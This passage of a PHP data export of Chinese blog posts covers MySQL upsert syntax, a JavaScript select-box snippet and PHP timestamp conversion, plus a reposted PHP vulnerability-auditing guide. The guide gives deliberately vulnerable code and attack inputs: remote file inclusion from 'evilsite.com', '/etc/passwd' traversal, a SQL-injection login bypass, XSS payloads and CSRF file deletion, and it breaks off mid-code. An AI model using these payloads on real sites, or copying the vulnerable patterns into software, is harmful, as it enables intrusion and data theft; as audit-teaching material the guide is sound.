DUPLICATE KEY UPDATE，并且插入行后会导致在一个UNIQUE索引或PRIMARY KEY中出现重复值，则执行旧行UPDATE。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;例如，如果列a被定义为UNIQUE，并且包含值1，则以下两个语句具有相同的效果：</p><pre class=\\"brush:sql;toolbar:false\\">INSERT&nbsp;INTO&nbsp;`table`&nbsp;(`a`,&nbsp;`b`,&nbsp;`c`)&nbsp;VALUES&nbsp;(1,&nbsp;2,&nbsp;3)&nbsp;ON&nbsp;DUPLICATE&nbsp;KEY&nbsp;UPDATE&nbsp;`c`=`c`+1;&nbsp;
UPDATE&nbsp;`table`&nbsp;SET&nbsp;`c`=`c`+1&nbsp;WHERE&nbsp;`a`=1;</pre><p>&nbsp;&nbsp;&nbsp;&nbsp;如果行作为新记录被插入，则受影响行的值为1；如果原有的记录被更新，则受影响行的值为2。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;注释：如果列b也是唯一列，则INSERT与此UPDATE语句相当：</p><pre class=\\"brush:sql;toolbar:false\\">UPDATE&nbsp;`table`&nbsp;SET&nbsp;`c`=`c`+1&nbsp;WHERE&nbsp;`a`=1&nbsp;OR&nbsp;`b`=2&nbsp;LIMIT&nbsp;1;</pre><p>&nbsp;&nbsp;&nbsp;&nbsp;如果a=1 OR b=2与多个行向匹配，则只有一个行被更新。通常，您应该尽量避免对带有多个唯一关键字的表使用ON DUPLICATE KEY子句。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;您可以在UPDATE子句中使用VALUES(col_name)函数从INSERT…UPDATE语句的INSERT部分引用列值。换句话说，如
果没有发生重复关键字冲突，则UPDATE子句中的VALUES(col_name)可以引用被插入的col_name的值。本函数特别适用于多行插入。
VALUES()函数只在INSERT…UPDATE语句中有意义，其它时候会返回NULL。</p><pre class=\\"brush:sql;toolbar:false\\">INSERT&nbsp;INTO&nbsp;`table`&nbsp;(`a`,&nbsp;`b`,&nbsp;`c`)&nbsp;VALUES&nbsp;(1,&nbsp;2,&nbsp;3),&nbsp;(4,&nbsp;5,&nbsp;6)&nbsp;ON&nbsp;DUPLICATE&nbsp;KEY&nbsp;UPDATE&nbsp;`c`=VALUES(`a`)+VALUES(`b`);</pre><p>&nbsp;&nbsp;&nbsp;&nbsp;本语句与以下两个语句作用相同：</p><pre class=\\"brush:sql;toolbar:false\\">INSERT&nbsp;INTO&nbsp;`table`&nbsp;(`a`,&nbsp;`b`,&nbsp;`c`)&nbsp;VALUES&nbsp;(1,&nbsp;2,&nbsp;3)&nbsp;ON&nbsp;DUPLICATE&nbsp;KEY&nbsp;UPDATE&nbsp;`c`=3;&nbsp;
INSERT&nbsp;INTO&nbsp;`table`&nbsp;(`a`,&nbsp;`b`,&nbsp;`c`)&nbsp;VALUES&nbsp;(4,&nbsp;5,&nbsp;6)&nbsp;ON&nbsp;DUPLICATE&nbsp;KEY&nbsp;UPDATE&nbsp;c=9;</pre><p>&nbsp;&nbsp;&nbsp;&nbsp;注释：当您使用ON DUPLICATE KEY UPDATE时，DELAYED选项被忽略。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;示例：<br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这个例子是我在实际项目中用到的：是将一个表的数据导入到另外一个表中，数据的重复性就得考虑(如下)，唯一索引为：email：</p><pre class=\\"brush:sql;toolbar:false\\">INSERT&nbsp;INTO&nbsp;`table_name1`&nbsp;(`title`,&nbsp;`first_name`,&nbsp;`last_name`,&nbsp;`email`,&nbsp;`phone`,&nbsp;`user_id`,&nbsp;`role_id`,&nbsp;`status`,&nbsp;`campaign_id`)&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;SELECT&nbsp;&#39;&#39;,&nbsp;&#39;&#39;,&nbsp;&#39;&#39;,&nbsp;`table_name2`.`email`,&nbsp;`table_name2`.`phone`,&nbsp;NULL,&nbsp;NULL,&nbsp;&#39;pending&#39;,&nbsp;29&nbsp;FROM&nbsp;`table_name2`&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;WHERE&nbsp;`table_name2`.`status`&nbsp;=&nbsp;1&nbsp;
ON&nbsp;DUPLICATE&nbsp;KEY&nbsp;UPDATE&nbsp;`table_name1`.`status`=&#39;pending&#39;</pre><p>&nbsp;&nbsp;&nbsp;&nbsp;再贴一个例子：</p><pre class=\\"brush:sql;toolbar:false\\">INSERT&nbsp;INTO&nbsp;`class`&nbsp;SELECT&nbsp;*&nbsp;FROM&nbsp;`class1`&nbsp;ON&nbsp;DUPLICATE&nbsp;KEY&nbsp;UPDATE&nbsp;`class`.`course`=`class1`.`course`</pre><p>&nbsp;&nbsp;&nbsp;&nbsp;其它关键：DELAYED&nbsp; 做为快速插入，并不是很关心失效性，提高插入性能。 <br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IGNORE&nbsp; 只关注主键对应记录是不存在，无则添加，有则忽略。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;更多信息请看:&nbsp; http://dev.mysql.com/doc/refman/5.1/zh/sql-syntax.html#insert</p><p>&nbsp;&nbsp;&nbsp;&nbsp;特别说明：在MYSQL中UNIQUE索引将会对null字段失效，也就是说(a字段上建立唯一索引)：</p><pre class=\\"brush:sql;toolbar:false\\">INSERT&nbsp;INTO&nbsp;`test`&nbsp;(`a`)&nbsp;VALUES&nbsp;(NULL);</pre><p>&nbsp;&nbsp;&nbsp;&nbsp;是可以重复插入的（联合唯一索引也一样）。</p><p>&nbsp;</p><p>&nbsp;&nbsp;&nbsp;&nbsp;转自：http://www.111cn.net/database/mysql/50135.htm</p><p><br/></p>',
            'keyword' => 'mysql,ignore',
            'sortid' => '4',
            'img' => '',
            'views' => '3',
            'comnum' => '0',
            'topway' => 'none',
            'status' => 'show',
            'datetime' => '2015-09-18 15:25:35',
          ),
          65 => 
          array (
            'id' => '20',
            'uid' => '1',
            'title' => '深入mysql \\"ON DUPLICATE KEY UPDATE\\" 语法的分析',
            'content' => '<p><span style=\\"color: #ff0000;\\">&nbsp;&nbsp;&nbsp;&nbsp;mysql &quot;ON DUPLICATE KEY UPDATE&quot; 语法<br/></span>&nbsp;&nbsp;&nbsp;&nbsp;如果在INSERT语句末尾指定了ON DUPLICATE KEY UPDATE，并且插入行后会导致在一个UNIQUE索引或PRIMARY KEY中出现重复值，则在出现重复值的行执行UPDATE；如果不会导致唯一值列重复的问题，则插入新行。 <br/>&nbsp;&nbsp;&nbsp;&nbsp;例如，如果列 a 为 主键 或 拥有UNIQUE索引，并且包含值1，则以下两个语句具有相同的效果：</p><pre class=\\"brush:sql;toolbar:false\\">INSERT&nbsp;INTO&nbsp;TABLE&nbsp;(a,c)&nbsp;VALUES&nbsp;(1,3)&nbsp;ON&nbsp;DUPLICATE&nbsp;KEY&nbsp;UPDATE&nbsp;c=c+1;
UPDATE&nbsp;TABLE&nbsp;SET&nbsp;c=c+1&nbsp;WHERE&nbsp;a=1;</pre><p>&nbsp;&nbsp;&nbsp;&nbsp;如果行作为新记录被插入，则受影响行的值显示1；如果原有的记录被更新，则受影响行的值显示2。 <br/>&nbsp;&nbsp;&nbsp;&nbsp;这个语法还可以这样用: <br/>&nbsp;&nbsp;&nbsp;&nbsp;如果INSERT多行记录(假设 a 为主键或 a 是一个 UNIQUE索引列):</p><pre class=\\"brush:sql;toolbar:false\\">INSERT&nbsp;INTO&nbsp;TABLE&nbsp;(a,c)&nbsp;VALUES&nbsp;(1,3),(1,7)&nbsp;ON&nbsp;DUPLICATE&nbsp;KEY&nbsp;UPDATE&nbsp;c=c+1;</pre><p>&nbsp;&nbsp;&nbsp;&nbsp;执行后, c 的值会变为 4 (第二条与第一条重复, c 在原值上+1).</p><pre class=\\"brush:sql;toolbar:false\\">INSERT&nbsp;INTO&nbsp;TABLE&nbsp;(a,c)&nbsp;VALUES&nbsp;(1,3),(1,7)&nbsp;ON&nbsp;DUPLICATE&nbsp;KEY&nbsp;UPDATE&nbsp;c=VALUES(c);</pre><p>&nbsp;&nbsp;&nbsp;&nbsp;执行后, c 的值会变为 7 (第二条与第一条重复, c 在直接取重复的值7). <br/><span style=\\"color: #ff0000;\\">&nbsp;&nbsp;&nbsp;&nbsp;注意：ON DUPLICATE KEY UPDATE只是MySQL的特有语法，并不是SQL标准语法！ <br/></span>&nbsp;&nbsp;&nbsp;&nbsp;这个语法和适合用在需要 判断记录是否存在,不存在则插入存在则更新的场景.<br/><br/><strong>&nbsp;&nbsp;&nbsp;&nbsp;INSERT INTO .. ON DUPLICATE KEY更新多行记录<br/></strong>&nbsp;&nbsp;&nbsp;&nbsp;如
果在INSERT语句末尾指定了ON DUPLICATE KEY UPDATE，并且插入行后会导致在一个UNIQUE索引或PRIMARY 
KEY中出现重复值，则执行旧行UPDATE；如果不会导致唯一值列重复的问题，则插入新行。例如，如果列a被定义为UNIQUE，并且包含值1，则以下
两个语句具有相同的效果：</p><pre class=\\"brush:sql;toolbar:false\\">INSERT&nbsp;INTO&nbsp;TABLE&nbsp;(a,b,c)&nbsp;
VALUES&nbsp;(1,2,3)&nbsp;ON&nbsp;DUPLICATE&nbsp;KEY&nbsp;UPDATE&nbsp;c=c+1;
UPDATE&nbsp;TABLE&nbsp;SET&nbsp;c=c+1&nbsp;WHERE&nbsp;a=1;</pre><p>&nbsp;&nbsp;&nbsp;&nbsp;如果行作为新记录被插入，则受影响行的值为1；如果原有的记录被更新，则受影响行的值为2。<br/>&nbsp;&nbsp;&nbsp;&nbsp;如果你想了解更多关于INSERT INTO .. ON DUPLICATE KEY的功能说明，详见MySQL参考文档：13.2.4. INSERT语法<br/><br/>&nbsp;&nbsp;&nbsp;&nbsp;现
在问题来了，如果INSERT多行记录， ON DUPLICATE KEY 
UPDATE后面字段的值怎么指定？要知道一条INSERT语句中只能有一个ON DUPLICATE KEY 
UPDATE，到底他会更新一行记录，还是更新所有需要更新的行。这个问题困扰了我很久了，其实使用VALUES()函数一切问题都解决了。<br/><br/>&nbsp;&nbsp;&nbsp;&nbsp;举个例子，字段a被定义为UNIQUE，并且原数据库表table中已存在记录(2,2,9)和(3,2,1)，如果插入记录的a值与原有记录重复，则更新原有记录，否则插入新行：</p><pre class=\\"brush:sql;toolbar:false\\">INSERT&nbsp;INTO&nbsp;TABLE&nbsp;(a,b,c)&nbsp;VALUES&nbsp;
(1,2,3),
(2,5,7),
(3,3,6),
(4,8,2)
ON&nbsp;DUPLICATE&nbsp;KEY&nbsp;UPDATE&nbsp;b=VALUES(b);</pre><p>&nbsp;&nbsp;&nbsp;&nbsp;以
上SQL语句的执行，发现(2,5,7)中的a与原有记录(2,2,9)发生唯一值冲突，则执行ON DUPLICATE KEY 
UPDATE，将原有记录(2,2,9)更新成(2,5,9)，将(3,2,1)更新成(3,3,1)，插入新记录(1,2,3)和(4,8,2)<br/><span style=\\"color: #ff0000;\\">&nbsp;&nbsp;&nbsp;&nbsp;注意：ON DUPLICATE KEY UPDATE只是MySQL的特有语法，并不是SQL标准语法！</span></p><p>&nbsp;</p><p><span style=\\"color: #000000;\\">&nbsp;&nbsp;&nbsp;&nbsp;转自：http://www.jb51.net/article/39255.htm</span></p><p><br/></p>',
            'keyword' => 'mysql',
            'sortid' => '4',
            'img' => '',
            'views' => '2',
            'comnum' => '0',
            'topway' => 'none',
            'status' => 'show',
            'datetime' => '2015-09-18 15:24:42',
          ),
          66 => 
          array (
            'id' => '19',
            'uid' => '1',
            'title' => 'js获取下拉框当前选中的值并弹出',
            'content' => '<p>代码：<br/><br/>this.options[this.selectedIndex].value<br/><br/>调用实例：</p><pre class=\\"brush:html;toolbar:false\\">&lt;script&nbsp;language=&quot;javascript&quot;&gt;
&nbsp;&nbsp;&nbsp;&nbsp;function&nbsp;mychange(value)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;alert&#40;value&#41;;
&nbsp;&nbsp;&nbsp;&nbsp;}
&lt;/script&gt;
 &lt;select&nbsp;name=&quot;sheng&quot;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&lt;option&nbsp;value=&quot;1&quot;&gt;1&lt;/option&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&lt;option&nbsp;value=&quot;2&quot;&gt;2&lt;/option&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&lt;option&nbsp;value=&quot;3&quot;&gt;3&lt;/option&gt;
&lt;/select&gt;</pre><p><br/></p>',
            'keyword' => 'js,下拉框',
            'sortid' => '7',
            'img' => '',
            'views' => '1',
            'comnum' => '0',
            'topway' => 'none',
            'status' => 'show',
            'datetime' => '2015-09-18 15:24:06',
          ),
          67 => 
          array (
            'id' => '18',
            'uid' => '1',
            'title' => 'php日期转时间戳,指定日期转换成时间戳',
            'content' => '<p>&nbsp;&nbsp;&nbsp;&nbsp;UNIX时间戳和格式化日期是我们常打交道的两个时间表示形式，Unix时间戳存储、处理方便，但是不直观，格式化日期直观，但是处理起来不如Unix时间戳那么自如，所以有的时候需要互相转换，下面给出PHP日期转时间戳、MySQL日期转换函数互相转换的几种转换方式</p><p>&nbsp;</p><p>&nbsp;&nbsp;&nbsp;&nbsp;写过PHP+MySQL的程序员都知道有时间差，UNIX时间戳和格式化日期是我们常打交道的两个时间表示形式，Unix时间戳存储、处理方便，但
 是不直观，格式化日期直观，但是处理起来不如Unix时间戳那么自如，所以有的时候需要互相转换，下面给出互相转换的几种转换方式。 <br/><br/><strong>一、在MySQL中完成</strong> <br/>　　 <br/>这种方式在MySQL查询语句中转换，优点是不占用PHP解析器的解析时间，速度快，缺点是只能用在数据库查询中，有局限性。 <br/>1. UNIX时间戳转换为日期用函数： FROM_UNIXTIME() <br/>一般形式：select FROM_UNIXTIME(1156219870); <br/>2. 日期转换为UNIX时间戳用函数： UNIX_TIMESTAMP() <br/>一般形式：Select UNIX_TIMESTAMP(&#39;2006-11-04 12:23:00′); <br/>举例：mysql查询当天的记录数： <br/>$sql=”select
 * from message Where DATE_FORMAT(FROM_UNIXTIME(chattime),&#39;%Y-%m-%d&#39;) = 
DATE_FORMAT(NOW(),&#39;%Y-%m-%d&#39;) order by id desc”; <br/>当然大家也可以选择在PHP中进行转换，下面说说在PHP中转换。 <br/><br/><strong>二、在PHP中完成</strong> <br/>　　 <br/>&nbsp;&nbsp;&nbsp;&nbsp;这种方式在PHP程序中完成转换，优点是无论是不是数据库中查询获得的数据都能转换，转换范围不受限制，缺点是占用PHP解析器的解析时间，速度相对慢。 <br/>1. UNIX时间戳转换为日期用函数： date() <br/>一般形式：date(&#39;Y-m-d H:i:s&#39;, 1156219870); <br/>2. 日期转换为UNIX时间戳用函数：strtotime() <br/>一般形式：strtotime(&#39;2010-03-24 08:15:42&#39;)； <br/><br/><strong>php日期转时间戳,指定日期转换成时间戳 <br/></strong><br/>&nbsp;&nbsp;&nbsp;&nbsp;php日期转时间戳、指定日期转换成时间戳，PHP定时任务。 <br/>这两天要实现这样功能： <br/>当达到某一条件时，让服务器发短信给用户，数量为多条。 <br/>基本思路：linux 定时扫描，若有满足条件的用户，则发送短信。 <br/>但为了防止打扰到用户，要求只能在白天8:00-20：00发送短信，怎么样获得到每天的这段时间区间？ <br/>如下代码：</p><p>代码如下:</p><pre class=\\"brush:php;toolbar:false\\">&lt;?
$y=date(&quot;Y&quot;,time());
$m=date(&quot;m&quot;,time());
$d=date(&quot;d&quot;,time());
$start_time&nbsp;=&nbsp;mktime(9,&nbsp;0,&nbsp;0,&nbsp;$m,&nbsp;$d&nbsp;,$y);
$end_time&nbsp;=&nbsp;mktime(19,&nbsp;0,&nbsp;0,&nbsp;$m,&nbsp;$d&nbsp;,$y);
$time&nbsp;=&nbsp;time();
if($time&nbsp;&gt;=&nbsp;$start_time&nbsp;&amp;&amp;&nbsp;$time&nbsp;&lt;=&nbsp;$end_time)
{
//&nbsp;do&nbsp;something....
}
?&gt;</pre><p>转自：http://www.jb51.net/article/30810.htm</p>',
            'keyword' => '时间,日期,时间戳',
            'sortid' => '6',
            'img' => '',
            'views' => '1',
            'comnum' => '0',
            'topway' => 'none',
            'status' => 'show',
            'datetime' => '2015-09-18 15:22:02',
          ),
          68 => 
          array (
            'id' => '17',
            'uid' => '1',
            'title' => '（转载）PHP漏洞挖掘思路',
            'content' => '<p>在文章中的测试条件下，我们的配置默认是这样子的</p><pre class=\\"highlight\\">safe_mode&nbsp;=&nbsp;off&nbsp;(避免各种奇奇怪怪的失败)
disabled_functions&nbsp;=&nbsp;N/A&nbsp;(&nbsp;可以使用全部函数，免得莫名其妙的不能用&nbsp;)
register_globals&nbsp;=&nbsp;on&nbsp;(&nbsp;注册全局变量&nbsp;)
allow_url_include&nbsp;=&nbsp;on&nbsp;(&nbsp;文件包含时的限制，如果关了就不能远程&nbsp;)
allow_url_fopen&nbsp;=&nbsp;on&nbsp;(&nbsp;文件打开的限制，还是开着吧&nbsp;)
magic_quotes_gpc&nbsp;=&nbsp;off&nbsp;(&nbsp;转义引号和划线和空字符，比如”&nbsp;变成\\\\“&nbsp;)
short_tag_open&nbsp;=&nbsp;on&nbsp;(&nbsp;部分脚本会用到&nbsp;)&nbsp;
file_uploads&nbsp;=&nbsp;on&nbsp;(&nbsp;任意文件上传需要……允许上传文件&nbsp;)
display_errors&nbsp;=&nbsp;on&nbsp;(&nbsp;自己测试时方便，找错误&nbsp;)</pre><h2>0x01 任意文件包含</h2><hr/><p>前提：允许url_include，否则就需要上传到绝对路径</p><p>提示：可以使用空字节（截断）的技巧，和“?”问号的使用技巧</p><p>php中有四个函数与文件包含有关：</p><pre class=\\"brush:php;toolbar:false\\">require
require_once&nbsp;只包含一次
include&nbsp;
include_once&nbsp;只包含一次</pre><p>如以下例子：</p><pre class=\\"brush:php;toolbar:false\\">&lt;?php
&nbsp;&nbsp;&nbsp;&nbsp;$pagina=$_GET[&#39;pagina&#39;];
&nbsp;&nbsp;&nbsp;&nbsp;include&nbsp;$pagina.&#39;logged=1&#39;;
?&gt;</pre><p>使用空字节的例子</p><pre class=\\"highlight\\">http://127.0.0.1/test.php?pagina=http://evilsite.com/evilscript.txt</pre><p>这样可以去掉末尾的.php后缀</p><p>再如以下例子</p><pre class=\\"brush:php;toolbar:false\\">&lt;?php
&nbsp;&nbsp;&nbsp;&nbsp;$pagina=$_GET[&#39;pagina&#39;];
&nbsp;&nbsp;&nbsp;&nbsp;include&nbsp;$pagina.&#39;logged=1&#39;;
?&gt;</pre><p>使用“?”问号的例子</p><pre class=\\"highlight\\">http://127.0.0.1/test.php?pagina=http://evilsite.com/evilscript.txt?logged=1</pre><p>这样可以把后面的一大坨东西弄没</p><p>如何修复：</p><pre class=\\"highlight\\">allow_url_include&nbsp;=&nbsp;on
allow_url_fopen&nbsp;=&nbsp;on</pre><p>简单来说：不要允许特殊字符出现，过滤“/”，或者过滤http，https，ftp和SMB</p><p>好吧，来举一个乌云上Frears的例子</p><p><a href=\\"http://www.wooyun.org/bugs/wooyun-2011-02654\\" target=\\"_blank\\">WooYun: ecmall本地文件包含</a></p><pre class=\\"brush:php;toolbar:false\\">//只判断是app是否设置，然后去掉了两端空格 
$app&nbsp;=&nbsp;isset($_REQUEST[&#39;app&#39;])&nbsp;?&nbsp;trim($_REQUEST[&#39;app&#39;])&nbsp;:&nbsp;$default_app; 
$act&nbsp;=&nbsp;isset($_REQUEST[&#39;act&#39;])&nbsp;?&nbsp;trim($_REQUEST[&#39;act&#39;])&nbsp;:&nbsp;$default_act; 
&nbsp;
//很明显可以看出$app是我们可以控制的、由于后面连接了.app.php所以利用的时候要截断。 
$app_file&nbsp;=&nbsp;$config[&#39;app_root&#39;]&nbsp;.&nbsp;&quot;/{$app}.app.php&quot;; &nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;
//应为是本地包函、所以is_file是为真的 
if&nbsp;(!is_file($app_file)) &nbsp;&nbsp;&nbsp;&nbsp;
{ &nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;exit(&#39;Missing&nbsp;controller&#39;); &nbsp;&nbsp;&nbsp;&nbsp;
} &nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;
//这里直接就包函了，这么低级的漏洞、我都不好说什么了. 
require($app_file);</pre><p>还有一些特殊的思路，比如Joker的构造</p><p><a href=\\"http://www.wooyun.org/bugs/wooyun-2011-02236\\" target=\\"_blank\\">WooYun: 济南大学主站本地文件包含导致代码执行</a></p><p>自己去看吧，我还以为只有教科书里边才可能出现……</p><p>挖掘的可能方法：全局搜索四个函数，先只管出现在文件中间的require等前后文是否有严格的验证，之后在通读时注意文件前部的include</p><h2>0x02 本地文件包含</h2><hr/><p>提示：在windows系统下面我们可以用 &quot;..\\\\&quot; 来代替 &quot;../&quot; 即 &quot;..%5C&quot; ( url编码后 ).</p><p>如下例：</p><pre class=\\"brush:php;toolbar:false\\">&lt;?php
&nbsp;&nbsp;&nbsp;&nbsp;$pagina=$_GET[&#39;pagina&#39;];
&nbsp;&nbsp;&nbsp;&nbsp;include&nbsp;&#39;/pages/&#39;.$pagina;
?&gt;</pre><p>利用的例子：</p><pre class=\\"highlight\\">http://127.0.0.1/test.php?pagina=../../../../../../etc/passwd</pre><p>空字节截断和问号的技巧通用</p><p>其实和上面的差不多，只不过是用到了跨目录</p><p>修复方式：过滤点和斜杠</p><h2>0x03 任意文件下载</h2><hr/><p>前提：url_fopen为on时才能打开远程文件，但一般意义上的任意文件下载不是“远程“的</p><p>相比上一篇文章补充：</p><pre class=\\"highlight\\">&nbsp;&nbsp;&nbsp;file_get_contents&nbsp;&nbsp;读取整个文件到字符串中
&nbsp;&nbsp;&nbsp;readfile&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;显示整个文件
&nbsp;&nbsp;&nbsp;file&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;读进数组
&nbsp;&nbsp;&nbsp;fopen&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;打开文件或URL
&nbsp;&nbsp;&nbsp;highlight_file&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;高亮显示源码
&nbsp;&nbsp;&nbsp;show_source&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;显示源代码</pre><p>例子同上一篇文章</p><h2>0x04 SQL注入</h2><hr/><p>前提：magic_quotes_gpc = off 当然指的是字符型的注射，如果是数字型就仍然可以盲注</p><p>补充登陆绕过的情况：</p><pre class=\\"brush:php;toolbar:false\\">$postbruger&nbsp;=&nbsp;$_POST[&#39;username&#39;];
$postpass&nbsp;=&nbsp;md5($_POST[&#39;password&#39;]);&nbsp;
$resultat&nbsp;=&nbsp;mysql_query(&quot;SELECT&nbsp;*&nbsp;FROM&nbsp;&quot;&nbsp;.&nbsp;$tablestart&nbsp;.&nbsp;&quot;login&nbsp;WHERE&nbsp;brugernavn&nbsp;=&nbsp;&#39;$postbruger&#39;&nbsp;AND&nbsp;password&nbsp;=&nbsp;&#39;$postpass&#39;&quot;)&nbsp;
or&nbsp;die(&quot;&lt;p&gt;&quot;&nbsp;.&nbsp;mysql_error()&nbsp;.&nbsp;&quot;&lt;/p&gt;\\\\n&quot;);</pre><p>这时利用时会方便很多</p><pre class=\\"highlight\\">username&nbsp;:&nbsp;admin&nbsp;&#39;&nbsp;or&nbsp;&#39;&nbsp;1=1
password&nbsp;:&nbsp;sirgod</pre><p>挖掘方法：在登陆逻辑处发现注射，不急着跑表，可以考虑绕过登陆</p><h2>0x05 命令执行</h2><hr/><p>参考《高级PHP应用程序漏洞审核技术》（Ph4nt0m Security Team），小伙伴们都去百度一下吧</p><p>（以下节选一小部分有关命令执行的内容）</p><h3>5.4 代码注射</h3><h4>5.4.1 PHP中可能导致代码注射的函数</h4><p>很多人都知道eval、preg_replace+/e可以执行代码，但是不知道php还有很多的函数可 以执行代码如：</p><pre class=\\"highlight\\">assert()
call_user_func()
call_user_func_array()
create_function()</pre><p>变量函数</p><p>这里我们看看最近出现的几个关于create_function()代码执行漏洞的代码：</p><pre class=\\"brush:php;toolbar:false\\">&lt;?php
//how&nbsp;to&nbsp;exp&nbsp;this&nbsp;code
$sort_by=$_GET[&quot;sort_by&quot;];
$sorter=&quot;strnatcasecmp&quot;;
$databases=array(&quot;test&quot;,&quot;test&quot;);
$sort_function&nbsp;=&nbsp;&quot;&nbsp;return&nbsp;1&nbsp;*&nbsp;&quot;&nbsp;.&nbsp;$sorter&nbsp;.&nbsp;&quot;($a[&quot;&quot;&nbsp;.&nbsp;$sort_by&nbsp;.&nbsp;&quot;&quot;],&nbsp;$b[&quot;&quot;&nbsp;.&nbsp;$sort_by&nbsp;.&nbsp;&quot;&quot;]);
&quot;;
usort($databases,&nbsp;create_function(&quot;$a,&nbsp;$b&quot;,&nbsp;$sort_function));</pre><p>漏洞审计策略</p><p>PHP版本要求：无 系统要求：无 审计策略：查找对应函数（assert,call_user_func,call_user_func_array,create_function等）</p><h4>5.4.2 变量函数与双引号</h4><p>对于单引号和双引号的区别，很多程序员深有体会，示例代码：</p><pre class=\\"brush:php;toolbar:false\\">echo&nbsp;&quot;$a\\\\n&quot;;
echo&nbsp;&quot;$a\\\\n&quot;;</pre><p>我们再看如下代码：</p><pre class=\\"brush:php;toolbar:false\\">//how&nbsp;to&nbsp;exp&nbsp;this&nbsp;code
if($globals[&quot;bbc_email&quot;]){
$text&nbsp;=&nbsp;preg_replace(
array(&quot;/\\\\[email=(.*?)\\\\](.*?)\\\\[\\\\/email\\\\]/ies&quot;,
&quot;/\\\\[email\\\\](.*?)\\\\[\\\\/email\\\\]/ies&quot;),
array(&quot;check_email(&quot;$1&quot;,&nbsp;&quot;$2&quot;)&quot;,
&quot;check_email(&quot;$1&quot;,&nbsp;&quot;$1&quot;)&quot;),&nbsp;$text);</pre><p>另外很多的应用程序都把变量用&quot;&quot;存放在缓存文件或者config或者data文件里，这样很 容易被人注射变量函数。</p><p>漏洞审计策略</p><p>PHP版本要求：无 系统要求：无 审计策略：通读代码</p><h2>0x06 跨站脚本漏洞XSS</h2><pre class=\\"brush:php;toolbar:false\\">&lt;?php
&nbsp;&nbsp;&nbsp;&nbsp;$name=$_GET[&#39;name&#39;];
&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;$name;
?&gt;
&nbsp;
http://127.0.0.1/test.php?name=&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;
&nbsp;
#!php
&lt;?php
&nbsp;&nbsp;&nbsp;&nbsp;$name=addslashes($_GET[&#39;name&#39;]);
&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&#39;&lt;table&nbsp;name=&quot;&#39;.$name.&#39;&quot;&gt;&lt;/table&gt;&#39;;
?&gt;

http://127.0.0.1/test.php?name=&quot;&gt;&lt;script&gt;alert(String.fromCharCode(88,83,83))&lt;/script&gt;</pre><p>fromCharCode用来绕过addslashes</p><p>挖掘方法：关注负责输出的代码，牢记之前程序处理变量的一般逻辑（过滤html标签的力度？）</p><h2>0x07 变量覆盖</h2><hr/><p>前提：需要register_gloabals = on</p><pre class=\\"brush:php;toolbar:false\\">&lt;?php
&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;($logged==true)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;&#39;Logged&nbsp;in.&#39;;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;else&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&#39;Not&nbsp;logged&nbsp;in.&#39;;
&nbsp;&nbsp;&nbsp;&nbsp;}
?&gt;</pre><div class=\\"line number13 index12 alt2\\"><code class=\\"php plain\\">http:</code><code class=\\"php comments\\">//127.0.0.1/test.php?logged=1</code></div><p>免认证即登陆</p><h2>0x08 admin节点可被越权访问</h2><hr/><pre class=\\"highlight\\">http://127.0.0.1/admin/files.php
http://127.0.0.1/admin/db_lookup.php</pre><p>若是无身份验证直接就能访问，可能存在此漏洞</p><p>挖掘方法：先开register_gloabals = on ，然后留意第一次出现的变量</p><h2>0x09 跨站点请求伪造CSRF</h2><hr/><p>前提：没有token 一般结合XSS来做</p><pre class=\\"brush:php;toolbar:false\\">&lt;?php
&nbsp;&nbsp;&nbsp;&nbsp;check_auth();
&nbsp;&nbsp;&nbsp;&nbsp;if(isset($_GET[&#39;news&#39;]))
&nbsp;&nbsp;&nbsp;&nbsp;{&nbsp;unlink(&#39;files/news&#39;.$news.&#39;.txt&#39;);&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;else&nbsp;{&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;die(&#39;File&nbsp;not&nbsp;deleted&#39;);&nbsp;}
?&gt;</pre><div class=\\"line number13 index12 alt2\\"><code class=\\"php plain\\">http:</code><code class=\\"php comments\\">//127.0.0.1/test.php?news=1</code></div><p>会导致文件删除，当然，需要过check_auth，不过在CSRF下不是问题</p><pre class=\\"brush:php;toolbar:false\\">if&nbsp;($_GET[&#39;func&#39;]&nbsp;==&nbsp;&#39;delete&#39;)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$del_id&nbsp;=&nbsp;$_GET[&#39;id&#39;];
